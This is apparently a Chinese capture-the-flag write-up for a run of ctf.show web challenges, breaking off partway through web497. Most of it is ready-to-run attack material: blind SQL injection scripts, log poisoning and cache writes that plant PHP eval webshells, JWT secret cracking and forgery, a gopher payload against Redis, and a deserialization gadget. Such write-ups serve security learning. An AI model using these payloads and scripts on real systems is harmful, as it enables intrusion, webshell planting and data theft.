访问debug显示权限不足，f12发现cookie多了auth字段判断权限，而且采用jwt，用jwt.io解密，sub改为admin，因为采用了HS256加密需要找secret，secret可以爆破就是123456

![image-20231121111616360](assets/image-20231121111616360.png)

把jwt字符串复制到cookie中，刷新页面提示file not exist

![image-20231121111632283](assets/image-20231121111632283.png)

剩下的就和上题一模一样了

![image-20231121111647608](assets/image-20231121111647608.png)

再次访问1.php执行命令就行了，另一种方法也是可以的

脚本一键化：将伪造的jwt放到脚本即可

```python
import requests
import base64
url="http://bf2e6fca-c437-4f5b-90c3-75b4087cfdc5.chall.ctf.show/"
url2="http://bf2e6fca-c437-4f5b-90c3-75b4087cfdc5.chall.ctf.show/debug/?file=/var/log/nginx/access.log"
cmd=b"<?php eval($_POST[1]);?>"
cmd=base64.b64encode(cmd).decode()
headers={
	'User-Agent':'''<?php system('echo {0}|base64 -d  > /var/www/html/b.php');?>'''.format(cmd),
	'Cookie':'auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYxMDQ0MDA5MSwiZXhwIjoxNjEwNDQ3MjkxLCJuYmYiOjE2MTA0NDAwOTEsInN1YiI6ImFkbWluIiwianRpIjoiYzNlM2U5NjQ4OGI3NWY0MzY4YmE4Njg0ZTRjZWJlZTQifQ.hEV8CkkdvhKsNL_OrssrBzjzstVhq7_sQNefiuplSqU'
}
print(headers)
requests.get(url=url,headers=headers)
requests.get(url2,headers=headers)
print(requests.post(url+'b.php',data={'1':'system("cat alsckdfy/check.php");'},headers=headers).text)

```

### 这里jwt相关的问题补充一下：

**jwt解码**：可以放到burp中，用json web tokens插件解码，当然也可以自己分段base64解码

![image-20231121112142787](assets/image-20231121112142787.png)

**jwt密钥爆破**：

- 已知`JWT`使用的加密算法
- 已知一段有效的、已签名的`token`
- 签名使用的密钥是弱密钥（可以爆破出来）

```
python jwt_tools.py <jwt字符串> -C -d 字典

参数-C表示对JWT进行压缩，以缩短字节长度。
参数-d指定了一个字典文件jwtboom.txt，该文件包含用于尝试破解JWT的可能密钥列表。
```

![image-20231121112821764](assets/image-20231121112821764.png)

**jwt伪造生成**：

1.利用上面爆破得到密钥：用脚本加密(当然也可能设置加密算法为 none 这样就不需要密钥了，这里是无需密钥的加密脚本)

```python
import time
import jwt
# payload
token_dict={
  "iss": "admin",
  "iat": 1610440091,
  "exp": 1610447291,
  "nbf": 1610440091,
  "sub": "admin",
  "jti": "c3e3e96488b75f4368ba8684e4cebee4"
}
# headers
headers = {
  "alg": "HS256",
  "typ": "JWT"
}
jwt_token = jwt.encode(token_dict,  # payload, 有效载体
                     key='123456',  #爆破得到的密钥放这里
                       headers=headers,  # json web token 数据结构包含两部分, payload(有效载体), headers(标头)
                       algorithm="HS256",  # 指明签名算法方式, 默认也是HS256
                       )  # python3 编码后得到 bytes, 再进行解码(指明解码的格式), 得到一个str
print(jwt_token)
```

得到伪造的密钥之后，替换登陆即可。

## web390（数字型注入）

**手注：**

```sql
page.php?id=1 union select 1,(select group_concat(username) from admin_user),(substr((select load_file('/var/www/html/alsckdfy/check.php')),1,255)) limit 1,1#
```

**sqlmap拿shell:**

```
sqlmap -u url --os-shell
```

> 这里补充下sqlmap getshell的要求：
>
> - 网站必须是root权限
> - 知道网站的绝对路径
> - PHP关闭魔术引号，php主动转义功能关闭
> - secure_file_priv=值为空

**也可使用sqlmap直接下载含有flag的文件:**

```bash
sqlmap -u url --file-read /var/www/html/alsckdfy/check.php --batch
```

## web391、392 （字符型注入）

同样存在注入

```bash
/search.php?title=aa' union select 1,substr((select load_file('/var/www/html/alsckdfy/check.php')),1,255),3 limit 0,1%23

sqlmap
python sqlmap.py -u http://042a780b-dfd3-4bd9-861c-81661b2915e0.chall.ctf.show/search.php?title=1 --file-read /var/www/html/alsckdfy/check.php --batch
```

392换了flag位置

```bash
search.php?title=aa%27%20union%20select%201,substr((select%20load_file(%27/flag%27)),1,255),3%20limit%200,1%23

#sqlmap
python sqlmap.py -u http://175efaca-626f-46a6-bddd-68246b90c5f5.chall.ctf.show/search.php?title=1 --os-shell
```

## web393（堆叠注入）

还是先用原来的方法直接进到shell里面，发下不行，读文件也不行，然后试了下–sql-shell可以成功。
 但是也是无法使用load_file 和outfile。那我们看下和上个题的界面有哪些不同。
 在最后面发现有个搜索引擎

![image-20231121122951666](assets/image-20231121122951666.png)

随便访问一个发现其实是读取的百度的前端代码。那么如果把地址改成file:///flag，或者自己再添加一个url是不是就可以了。
 先利用sqlmap跑出来数据库的表名列名

![image-20231121123007203](assets/image-20231121123007203.png)

![image-20231121123014742](assets/image-20231121123014742.png)

payload:
 `search.php?title=1';insert into link values(10,'a','file:///flag');`

（在search.php页面存在堆叠注入）
 然后访问`link.php?id=10`就能得到flag

## web394-395（堆叠注入加绕过）

和上题一样只不过需要16进制绕过

```sql
url/search.php?title=1';insert into link values(10,'a',0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870); 
#对应的字符串为 file:///var/www/html/alsckdfy/check.php
```

然后通过ssrf访问我们插入的 file:// 协议即可

![image-20231121123308343](assets/image-20231121123308343.png)



### 非预期解：攻击redis、fastcgi

攻击redis服务，fastcig
就是把上面的16进制改成攻击redis或者fastcgi的payload
然后访问下就可以了
但是前面要做一些工作，题目中的url字段默认长度最长为255所以我们需要修改下，
payload:

```
search.php?title=1';alter table link modify column url text;
```

然后就可以打相应的服务了。具体可以参考ssrf篇的360。
发下我的payload吧

```sql
search.php?title=1';insert into link values(11,'a',0x676f706865723a2f2f3132372e302e302e313a363337392f5f2532413125304425304125323438253044253041666c757368616c6c2530442530412532413325304425304125323433253044253041736574253044253041253234312530442530413125304425304125323432382530442530412530412530412533432533467068702532306576616c2532382532345f504f5354253542312535442532392533422533462533452530412530412530442530412532413425304425304125323436253044253041636f6e666967253044253041253234332530442530417365742530442530412532343325304425304164697225304425304125323431332530442530412f7661722f7777772f68746d6c2530442530412532413425304425304125323436253044253041636f6e666967253044253041253234332530442530417365742530442530412532343130253044253041646266696c656e616d65253044253041253234372530442530416162632e706870253044253041253241312530442530412532343425304425304173617665253044253041253041);
```

然后访问link.php?id=11就会生成abc.php 密码是1

# 0x0F 代码审计

https://www.yuque.com/yq1ng/ctf/ip85w2#web301

# 0x10 期中考核（主要是代码审计）

https://blog.csdn.net/miuzzx/article/details/115014138

## web486(目录穿越)

目录穿越，淦，一开始就想着SQL注入，虽然尝试好一会就感觉没有跟数据库的交互。还是对URL的观察不仔细啊

观察首页url,

```
http://68e8c1cb-2f47-4c6e-807c-a759ac52c4bc.challenge.ctf.show/index.php?action=login
```

扫目录没法扫，查看源码没东西，于是一通注入测试，发现跟数据库没交互，之后观察url，发现action参数，猜测有类似文件包含的作用，于是尝试?action=index,?action=xxx尝试看看有没有变化

![image-20231122094353016](assets/image-20231122094353016.png)

说明猜测正确，是调用了一个 file_get_contents 函数来打开文件，所以这里直接读取文件，因为这个写了一个 templates 路径，所以要进行目录穿越尝试：?action=../index  ?action=../flag

得到flag

## web487(代码审计、sql盲注（bool\时间）)

- ?action=../index再ctrl+U读取源码，发现`username`存在`sql盲注`，跑脚本

```php
include('render/render_class.php');
include('render/db_class.php');



$action=$_GET['action'];
if(!isset($action)){
	header('location:index.php?action=login');
	die();	
}

if($action=='check'){
	$username=$_GET['username'];
	$password=$_GET['password'];
	$sql = "select id from user where username = md5('$username') and password=md5('$password') order by id limit 1";
	$user=db::select_one($sql);
	if($user){
		templateUtil::render('index',array('username'=>$username));
	}else{
		header('location:index.php?action=login');
	}
}

if($action=='login'){
	templateUtil::render($action);
}else{
	templateUtil::render($action);
}
```

### **时间盲注（好脚本）**

```python
二分法脚本，get/post都可用
import requests
import time

url = "http://6243abfb-3366-401c-aba0-7d770cb425c1.challenge.ctf.show/index.php"
flag = ''

proxies = {
    "http": "http://127.0.0.1:8080"#出错找不到原因的时候，不妨写个代理，抓包看看
}
for i in range(1, 200):
    low = 27
    high = 133
    mid = (low + high) // 2
    while low < high:
        payload = "') union select if((ascii(substr((select group_concat(flag) from flag),{0},1))>{1}),sleep(2),1)-- ".format(i, mid)

        data = {
            "action":"check",
            "username":payload,
            "password":"1"
        }
        time1 = time.time()
        r = requests.get(url, params=data, proxies=proxies)#GET:params=data POST:data=data
        time2 = time.time()

        # print(low, mid, high)

        if time2 - time1 > 2:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    flag += chr(mid)
    print(flag)
    if mid == 27:
        print(flag)
        break


        
更快
import requests

url = "http://6243abfb-3366-401c-aba0-7d770cb425c1.challenge.ctf.show/index.php?action=check&password=1&username=1"
flag = ''
proxies = {
    "http": "http://127.0.0.1:8080"#出错找不到原因的时候，不妨写个代理，抓包看看
}
for i in range(1,250):
   low = 32
   high = 128
   mid = (low+high)//2
   while(low<high):
       payload = url+"') union select if((ascii(substr((select group_concat(flag) from flag),{0},1))>{1}),sleep(3),1)-- ".format(i,mid)
       try:
            requests.get(url=payload,timeout=1,proxies=proxies)  # 设置请求延时时限，上面休眠5秒，因此这里设置时限3秒，超时就丢弃，不等它跑完，提速
       except:
            low = mid+1
       else:
           high = mid
       mid = (low+high)//2
   if(mid ==32 or mid ==127):
       break
   flag = flag+chr(mid)
   print(flag)
```

### **bool盲注**

```python
import requests
import time

flag = ''

for i in range(1,250):
    time.sleep(0.04)
    low = 32
    high = 128
    mid = (low+high)//2
    while(low<high):
        payload = "http://f36f977d-5543-4846-b3ee-d869355fc261.challenge.ctf.show/index.php?action=check&username=admin') and ascii(substr((select group_concat(flag) from flag),{0},1))>{1}--+&password=1".format(i,mid)
        r = requests.get(payload)#get 方法传数据
        # print(payload)
        time.sleep(0.04)
        if 'admin' in r.text:#二分法
            low = mid+1
        else:
            high = mid
        mid = (low+high)//2
    if(mid ==32 or mid ==127):
        break
    flag = flag+chr(mid)
    print(flag)
```



## web488（代码审计）

- 查看源码,通过action参数把每个文件下载下来

![image-20211011223736082](assets/2021-10-11-143736.png)

- `index.php`

```php
if($action=='check'){
    $username=$_GET['username'];
    $password=$_GET['password'];
    $sql = "select id from user where username = '".md5($username)."' and password='".md5($password)."' order by id limit 1";
    $user=db::select_one($sql);
    if($user){
        templateUtil::render('index',array('username'=>$username));
    }else{
        templateUtil::render('error',array('username'=>$username));
    }
}
```

由于不知道`usename，password`,`if语句`不会执行,执行`else语句`

跟进`render`函数

```
render_class.php
```

```php
class templateUtil {
    public static function render($template,$arg=array()){//$template就是error
        if(cache::cache_exists($template)){
            echo cache::get_cache($template);
        }else{
            $templateContent=fileUtil::read('templates/'.$template.'.php'); //读取error.php的内容
            $cache=templateUtil::shade($templateContent,$arg);
            cache::create_cache($template,$cache);//把转换后的内容写进文件，注意写进之后文件内容就无法改变
            echo $cache;
        }
    }
    public static  function shade($templateContent,$arg){ //$arg就是我们输入的username=我们输入的东西
        foreach ($arg as $key => $value) {
            $templateContent=str_replace('{{'.$key.'}}', $value, $templateContent);//把键名换成值，这是我们可控的
        }
        return $templateContent;
    }

}
```

跟进`cache`类:

```php
class cache{
    public static function create_cache($template,$content){ //$templates是error
        if(file_exists('cache/'.md5($template).'.php')){
            return true;
        }else{
            fileUtil::write('cache/'.md5($template).'.php',$content);
        }
    }
    public static function get_cache($template){
        return fileUtil::read('cache/'.md5($template).'.php');
    }
    public static function cache_exists($template){
        return file_exists('cache/'.md5($template).'.php');
    }

}
```

跟进`fileUtil`类:

```php
class fileUtil{

    public static function read($filename){
        return file_get_contents($filename);//读取文件内容
    }

    public static function write($filename,$content,$append =0){
        if($append){
            file_put_contents($filename, $content,FILE_APPEND);
        }else{
            file_put_contents($filename, $content);
        }
    }
}
```

1. 由上面的分析可以知道，我们可控的参数是`usename`
2. 由于不能调用if语句，而调用else语句，也就是调用`templateUtil`的静态`render`方法,参数是`error`以及我们输入的`username`的值和`username`组成的数组
3. `render`函数中调用了`cache`的静态函数，首先会判断`/cache/md5(error).php`文件存不存在,不存在的话调用`fileUtil`的静态`read`函数,来读取`templates/error.php`的内容(题目环境本身就有，而且该文件的内容有`{{username}}`这样一个字符串)
4. 读取完文件的内容之后，把`{{username}}`中的`username`替换成我们输入的内容(这里就想到能写入一句话)，替换完之后，调用cache类的静态`create_cache`函数,也就是把替换完之后的字符串写进`cache/md5(error).php`文件中(这个文件就相当于一句话文件)

**注意:**

md5(error)需要转换成真正的md5值

**执行过程:**

- 重开环境写入一句话：

```http
?action=check&username=<?php @eval($_POST[1]);?>&password=1
```

- 访问`cache/md5(error).php`，执行一句话

```http
http://d50aae2e-5c83-49f0-b3e8-de3f61842acf.challenge.ctf.show:8080/cache/cb5e100e5a9a3e7f6d1fd97512215282.php
```



![image-20211011230743830](assets/2021-10-11-150744.png)

**image-20211011230743830**



## web489（extract()变量覆盖）

- 扒源码:

  ```php
  if($action=='check'){
      $sql = "select id from user where username = '".md5($username)."' and password='".md5($password)."' order by id limit 1";
      extract($_GET);
      $user=db::select_one($sql);
      if($user){
          templateUtil::render('index',array('username'=>$username));
      }else{
          templateUtil::render('error');
      }
  }
  ```

`index.php`中不再允许`error`写入，但是我们可以控制`GET参数`,那么我们就可以重写`sql语句`,通过`if语句`执行写进一句话木马

```html
?action=check&usename=<?php eval($_POST[1]);phpinfo();?>&sql=select 1;
```

直接访问`/cache/6a992d5529f459a44fee58c733255e86.php`执行一句话



或者换一种思路，覆盖$sql,执行我们的自定义的sql语句，来进行注入读取文件

```python
import requests
url="http://e01d42ab-f4d9-4c1a-a320-9c516b190af0.challenge.ctf.show:8080/index.php?action=check&sql=select "
s="abcdef0123456789-}"
flag=""
for i in range(9,45):
	print(i)
	for j in s:
		u=url+"if(substr((select load_file('/flag')),{0},1)='{1}',sleep(3),1)".format(i,j)
		try:
			requests.get(u,timeout=(2.5,2.5))
		except:
			flag+=j
			print(flag)
			break
```



## web490

- `index.php`页面,调用的参数查询结果的参数

```php
if($action=='check'){
    extract($_GET);
    $sql = "select username from user where username = '".$username."' and password='".md5($password)."' order by id limit 1";
    $user=db::select_one($sql);
    if($user){
        templateUtil::render('index',array('username'=>$user->username));
    }else{
        templateUtil::render('error');
    }
}
```

在`user`查到结果之后，调用`username属性`，也就是将`username`的字符串写进页面

查看其他页面:

**cache类：**

写的时候包含了短标签，所以我们只需要写一句话

```http
?action=check&username=' union select 'eval($_POST[1]);' as username;%23&password=1
```

- 之后访问`cache/6a992d5529f459a44fee58c733255e86.php`,rce

## web491(bool盲注)

- 不能写马，继续利用sqlbool注入

```php
import requests
import time

flag = ''
url = "http://ffc69c8d-fdd7-428d-bfab-c9c411efb906.challenge.ctf.show/index.php"
proxies = {
    "http": "http://127.0.0.1:8080"#出错找不到原因的时候，不妨写个代理，抓包看看
}
for i in range(1,250):
    time.sleep(0.04)
    low = 27
    high = 133
    mid = (low+high)//2
    while(low<high):
        payload = "admin' or ascii(substr((select load_file('/flag')),{0},1))>{1}-- ".format(i, mid)
        data = {
            "action":"check",
            "username":payload,
            "password":"1"
        }
        r = requests.get(url=url,params=data,proxies=proxies)#get 方法传数据
        time.sleep(0.04)#防止服务器崩掉
        if 'flag' in r.text:#二分法
            low = mid+1
        else:
            high = mid
        mid = (low+high)//2
    if(mid ==27):
        break
    flag = flag+chr(mid)
    print(flag)
```

## web492（extract()变量覆盖）

- 看源码：

```php
$action=$_GET['action'];
if($action=='check'){
    extract($_GET);
    if(preg_match('/^[A-Za-z0-9]+$/', $username)){
        $sql = "select username from user where username = '".$username."' and password='".md5($password)."' order by id limit 1";
        $user=db::select_one_array($sql);
    }
    if($user){//$user没有初始化
        templateUtil::render('index',$user);
    }else{
        templateUtil::render('error');
    }
}
```

- `cache_class.php`

```php
public static  function shade($templateContent,$arg){ //参数是一个数组
    foreach ($arg as $key => $value) {
        $templateContent=str_replace('{{'.$key.'}}', '<?='.$value.'?>', $templateContent); //尝试绕过数组
    }
    return $templateContent;
}
```

- `extract`覆盖`$user`的值,绕过注释，并且`$user`必须是个数组(参数限制)

- 因为$username只能用数字字母了，所以sql注入的可能性就很小了。
  但是往下看templateUtil::render('index',\$user);
  如果我们能够进入这个里面，并且使得$user可控，就和前面的写入cache差不多了.
  我们看到 $user是正则匹配以后赋的值，只要不进那个if是不是我们就可以通过变量覆盖给user赋值了。
  那么怎么跳过$user=db::select_one_array($sql);可以想到给username传数组的话，就饶过了正则表达式。
  payload

  ```
  ?action=check&username[]=1&password=123&user[username]=<?php eval($_POST[1]);?>
  ?action=check&user[username]=A--><?php eval($_POST[1]);?><!--B&username=!&password=1
  ```

  然后访问
  /cache/6a992d5529f459a44fee58c733255e86.php

```http

```

![image-20211014165359554](assets/2021-10-14-085359.png)

- 访问`cache/6a992d5529f459a44fee58c733255e86.php`页面:

![image-20211014165551877](assets/2021-10-14-085552.png)



## web493(反序列化)

- 查看源码

index.php

```php
$action=$_GET['action'];
if(!isset($action)){
    if(isset($_COOKIE['user'])){
        $c=$_COOKIE['user'];
        $user=unserialize($c);
        if($user){
            templateUtil::render('index');
        }else{
            header('location:index.php?action=login');
        }
    }else{
        header('location:index.php?action=login');
    }
    die();
}

if($action=='check'){
    extract($_GET);
    if(preg_match('/^[A-Za-z0-9]+$/', $username)){
        $sql = "select username from user where username = '".$username."' and password='".md5($password)."' order by id limit 1";
        $db=new db();
        $user=$db->select_one($sql);
    }
    if($user){
        setcookie('user',$user);
        templateUtil::render('index');
    }else{
        templateUtil::render('error');
    }
}
```

- 如果没有`action`,则会检查`cookie`的`user`值存不存在,如果存在则调用反序列化，
- 提交了`action`,如果`action=check`则会调用反序列户的方法，将`cookie`里的`user`值进行反序列

`db_class.php`:

```php
class dbLog{
    public $sql;
    public $content;
    public $log;

    public function __construct(){
        $this->log='log/'.date_format(date_create(),"Y-m-d").'.txt';
    }
    public function log($sql){
        $this->content = $this->content.date_format(date_create(),"Y-m-d-H-i-s").' '.$sql.' \r\n';
    }
    public function __destruct(){
        file_put_contents($this->log, $this->content,FILE_APPEND);
    }
}
```

- 这个类的析构函数调用时，会写入文件，而且由于`cookie的参数`可控，那么`dblog`的属性也可控

### 解题方法:

1. 先`check`覆盖`user`(添加`cookie`值)

2. 获取`user值`的序列化字符串

   ```php
   <?php
   class dbLog{
       public $sql;
       public $content = '<?php eval($_POST[1]);?>';
       public $log;
   
       public function __construct(){
           $this->log='/var/www/html/1.php';
       }
       public function __destruct(){
           file_put_contents($this->log, $this->content,FILE_APPEND);
       }
   }
   
   $a = new dblog();
   echo urlencode(serialize($a));
   
   O%3A5%3A%22dbLog%22%3A3%3A%7Bs%3A3%3A%22sql%22%3BN%3Bs%3A7%3A%22content%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3Bs%3A3%3A%22log%22%3Bs%3A19%3A%22%2Fvar%2Fwww%2Fhtml%2F1.php%22%3B%7D
   ```

```http
?action=check&user=O%3A5%3A%22dbLog%22%3A3%3A%7Bs%3A3%3A%22sql%22%3BN%3Bs%3A7%3A%22content%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3Bs%3A3%3A%22log%22%3Bs%3A19%3A%22%2Fvar%2Fwww%2Fhtml%2F1.php%22%3B%7D
```

1. 不添加`action`访问一遍主页，之后访问`1.php`,密码是1，执行`rce`

![image-20211015082725904](assets/2021-10-15-002726.png)



## web494

- 尝试利用sql查询，因为`$user`是查询结果,会被输出

```http
?action=check&username=' || if(2>1,sleep(3),1);%23
```

存在延时,由于不知道列名，使用无列名注入



![image-20211015105502042](assets/2021-10-15-025502.png)

截取第一行:

![image-20211015105618534](assets/2021-10-15-025619.png)



尝试盲注：

```http
?action=check&username=' || if((substr((select `3` from(select 1,2,3 union select * from flag)a limit 1,1),1,1)='c'),sleep(3),1);%23
```



![image-20211015105836787](assets/2021-10-15-025837.png)

之前的`sql脚本`加一个`get_flag3()`：

```php
import requests

url = "http://099d2692-4e28-4d34-a231-0af180b032a7.challenge.ctf.show/index.php?action=check&username="

end = "&password=1"

strings ="}abcdefghijklmnopqrstuvwxyz0123456789{,-@"
def get_table_name():
    ret = ''
    for x in range(1,10):
        for y in strings:
            payload = "') union select if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1)='{}',sleep(2),1)--+".format(x,y)
            try:
                response = requests.get(url+payload+end,timeout=2)
                #print(response.url)
            except:
                ret+=y
                print(ret)
    return ret
def get_flag_columns():
    columns = ''
    for x in range(1,50):
        for y in strings:
            payload = "') union select if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag'),{},1)='{}',sleep(2),1)--+".format(
                x, y)
            try:
                response = requests.get(url + payload + end, timeout=2)
                # print(response.url)
            except:
                columns += y
                print(columns)
                break
        if y=='@':
            break
    return columns
def get_flag():
    flag = ''
    for x in range(17, 50):
        for y in strings:
            payload = "') union select if(substr((select flag from flag),{},1)='{}',sleep(2),1)--+".format(
                x, y)
            try:
                response = requests.get(url + payload + end, timeout=2)
                # print(response.url)
            except:
                flag += y
                print(flag)
                break
        if y =='@':
            break
    return flag
def get_flag2():
    flag = ''
    for x in range(1, 50):
        for y in strings:
            payload = "' or 1=1 and if(substr((select load_file('/flag')),{},1)='{}',sleep(2),1)--+".format(
                x, y)
            try:
                response = requests.get(url + payload + end, timeout=2)
                # print(response.url)
            except:
                flag += y
                print(flag)
                break
        if y == '@':
            break
    return flag
def get_flag3():
    flag = ''
    for x in range(1, 50):
        for y in strings:
            payload = "'|| if((substr((select `3` from(select 1,2,3 union select * from flag)a limit 1,1),{},1)='{}'),sleep(2),1)%23".format(x,y)
            try:
                response = requests.get(url + payload, timeout=2)
                # print(response.url)
            except:
                flag += y
                print(flag)
                break
        if y == '@':
            break
    return flag
if __name__=='__main__':
    #flag,user
    #ret=get_table_name()
    #print(ret)
    #flag
    #columns=get_flag_columns()
    #flag = get_flag2()
    #print(flag)
    flag = get_flag3()
    print(flag)
    #ctfshow{5dedc595-d2ef-43be-a2c0-988d91795221}
```



![image-20211015111908337](assets/2021-10-15-031908.png)



**或者，直接在username进行无列名注入**:

```http
?action=check&username=' union select `3` from(select 1,2,3 union select * from flag)a limit 1,1;%23
```



![image-20211015111753743](assets/2021-10-15-031753.png)





![image-20211015111706974](assets/2021-10-15-031707.png)



## web495

- 拿脚本爆表名:

```python
import requests

url = "http://9480fc2e-cef0-4989-a635-1f74ed79e631.challenge.ctf.show/index.php?action=check"

end = "&password=1"

strings ="}abcdefghijklmnopqrstuvwxyz0123456789{,-@"


def get_table_name_by_post():
    ret = ''
    for x in range(1, 10):
        for y in strings:
            try:
                data = {
                    'username': "' union select 1,if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1)='{}',sleep(2),1);#".format(x, y),
                    'password':"1"
                }
                response = requests.post(url,data=data, timeout=2)
                # print(response.url)
            except:
                ret += y
                print(ret)
                break
        if y=='@':
            break
    return ret
  
  if __name__=='__main__':
    table_name=get_table_name_by_post()
    print(table_name)
```



![image-20211015174500802](assets/2021-10-15-094501.png)



- 查列名:

```php
import requests

url = "http://24dd7c9d-31b5-4614-a1e3-a85105be90ed.challenge.ctf.show/index.php?action=check"

end = "&password=1"

strings ="}abcdefghijklmnopqrstuvwxyz0123456789{,-@"


def get_table_name_by_post():
    ret = ''
    for x in range(1, 20):
        for y in strings:
            try:
                data = {
                    'username': "' union select 1,if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1)='{}',sleep(2),1);#".format(x,y),
                    'password':"1"
                }
                response = requests.post(url,data=data, timeout=2)
                # print(response.url)
            except:
                ret += y
                print(ret)
                break
        if y=='@':
            break
    return ret

def get_column_name_by_post():
    ret = ''
    for x in range(1, 40):
        for y in strings:
            try:
                data = {
                    'username': "' union select 1,if(substr((select column_name from information_schema.columns where table_name='flagyoudontknow' limit 2,1),{},1)='{}',sleep(2),1);#".format(x,y),
                    'password':"1"
                }
                response = requests.post(url,data=data, timeout=2)
                #print(response.url)
            except:
                ret += y
                print(ret)
                break
        if y=='@':
            break
if __name__=='__main__':
     column_name=get_column_name_by_post()
     print(column_name)
```



```python
import requests

url = "http://24dd7c9d-31b5-4614-a1e3-a85105be90ed.challenge.ctf.show/index.php?action=check"

end = "&password=1"

strings ="}abcdefghijklmnopqrstuvwxyz0123456789{,-@"
def get_flag_by_post():
    flag = ''
    for x in range(1, 50):
        for y in strings:
            try:
                data = {
                    'username': "' union select 1,if(substr((select flagisherebutyouneverknow from flagyoudontknow),{},1)='{}',sleep(2),1);#".format(
                x, y),
                    'password': "1"
                }
                response = requests.post(url,data=data,timeout=2)
                # print(response.url)
            except:
                flag += y
                print(flag)
                break
        if y =='@':
            break
    return flag
  if __name__=='__main__':
    flag = get_flag_by_post()
    print(flag)
```



![image-20211015192751916](assets/2021-10-15-112752.png)

**image-20211015192751916**



## web496(update注入)

在 index 文件中，反序列化函数被注释了，很显然不在考察这个点，先万能密码登录

- 查看`index.php`

```php
switch ($action) {
    case 'check':
        $username=$_POST['username'];
        $password=$_POST['password'];
        if(!preg_match('/or|file|innodb|sys|mysql/i', $username)){
            $sql = "select username,nickname from user where username = '".$username."' and password='".md5($password)."' order by id limit 1";
            $db=new db();
            $user=$db->select_one_array($sql);
        }
        if($user){
            $_SESSION['user']=$user;
            header('location:index.php?action=index');
        }else{
            templateUtil::render('error');
        }
     case 'view':
        $user=$_SESSION['user'];
        if($user){
            templateUtil::render($_GET['page'],$user);
        }else{
            header('location:index.php?action=login');
        }
        break;
```

`render_class.php`:

```php+HTML
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-03-08 17:52:18
# @Last Modified by:   h1xa
# @Last Modified time: 2021-03-14 09:23:59
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

include('file_class.php');
include('cache_class.php');

class templateUtil {
	public static function render($template,$arg=array()){
		$templateContent=fileUtil::read('templates/'.$template.'.php');
		$cache=templateUtil::shade($templateContent,$arg);
		echo $cache;
	}
	public static  function shade($templateContent,$arg=array()){
		foreach ($arg as $key => $value) {
			$templateContent=str_replace('{{'.$key.'}}', $value, $templateContent);
		}
		return $templateContent;
	}

}
render函数`不能写，我们无法利用`写shell
```

尝试一下注入

```python
username=' union select 1,2%23
```

![image-20211015200338753](assets/2021-10-15-120339.png)

- 修改昵称尝试抓包

![image-20211015201652873](assets/2021-10-15-121653.png)

读取源码:

`api/admin_edit.php`：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-03-15 04:27:41
# @Last Modified by:   h1xa
# @Last Modified time: 2021-03-15 05:36:01
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
session_start();
include('../render/db_class.php');

error_reporting(0);
$user= $_SESSION['user'];
$ret = array(
		"code"=>0,
		"msg"=>"查询失败",
		"count"=>0,
		"data"=>array()
	);
if($user){
	extract($_POST);
	$sql = "update user set nickname='".substr($nickname, 0,8)."' where username='".$user['username']."'";
	$db=new db();
	if($db->update_one($sql)){
		$_SESSION['user']['nickname']=$nickname;
		$ret['msg']='管理员信息修改成功';
	}else{
		$ret['msg']='管理员信息修改失败';
	}
	die(json_encode($ret));

}else{
	$ret['msg']='请登录后使用此功能';
	die(json_encode($ret));
}
```



![image-20211015200505792](assets/2021-10-15-120506.png)



- 由图可知登陆名称是`username`，显示名称是`nickname`
- `sql语句`中可能存在注入，尝试`盲注`
- 上面的`1`就是`username`中存在`sql注入`,尝试修改1为`sql语句`，而且sql语句还过滤了`or`

![image-20211015204320918](assets/2021-10-15-124321.png)

- 访问`api/admin_edit.php`会发现有延时

- `$user['name']`很显然可以被我们覆盖,所以写脚本逻辑:

  - 先访问`?admin=check`,传递`username`参数,获取session值
  - 再访问`api/admin_edit.php`,由于`session`值满足`if条件`，我们直接覆盖`$user['username']`，进行`sql注入`

  

  ![image-20211015225153388](assets/2021-10-15-145153.png)

  

  

  ![image-20211015230334545](assets/2021-10-15-150335.png)

  

- 写脚本

```python
import requests
import random
url1 = "http://8741a903-9c0f-4f32-b6b0-8768b429fbad.challenge.ctf.show/index.php?action=check"
url2 = "http://8741a903-9c0f-4f32-b6b0-8768b429fbad.challenge.ctf.show/api/admin_edit.php"

data = {
    'username':"' || 1#",
    'password': "1"
}
session = requests.session()
session.post(url=url1,data=data)

flag = ''
for i in range(1,60):
    header = 32
    tail = 127
    while header<tail:
        mid = (header+tail)>>1
        #payload="' or if((ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=database())),{},1))>{}),1,0)#".format(i,mid)
        #flagyoudontknow76,user
        #payload = "' or if((ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema=database() and table_name='flagyoudontknow76')),{},1))>{}),1,0)#".format(i, mid)
        #id,tempdatayouneverknowit32,flagisherebutyouneverknow118
        payload = "' or if((ascii(substr((select/**/flagisherebutyouneverknow118/**/from/**/flagyoudontknow76),{},1))>{}),1,0)#".format(i, mid)
        data = {
            "user[username]": payload,
            'nickname':random.randint(0,9999999)
        }
        response = session.post(url=url2,data=data)
        if 'u529f' in response.text:
            header = mid + 1
        else:
            tail = mid
    if header!=32:
        flag+=chr(header)
        print(flag)
    else:
        break
```



![image-20211015230629845](assets/2021-10-15-150630.png)



![image-20211015225016876](assets/2021-10-15-145017.png)



## web497（SSRF）

- 查看代码:

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2021-03-08 15:43:51
# @Last Modified by:   h1xa
# @Last Modified time: 2021-03-15 07:34:08
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
session_start();
include('render/render_class.php');
include('render/db_class.php');


$action=$_GET['action'];


if(!isset($action)){
	if(isset($_COOKIE['user'])){
		$c=$_COOKIE['user'];
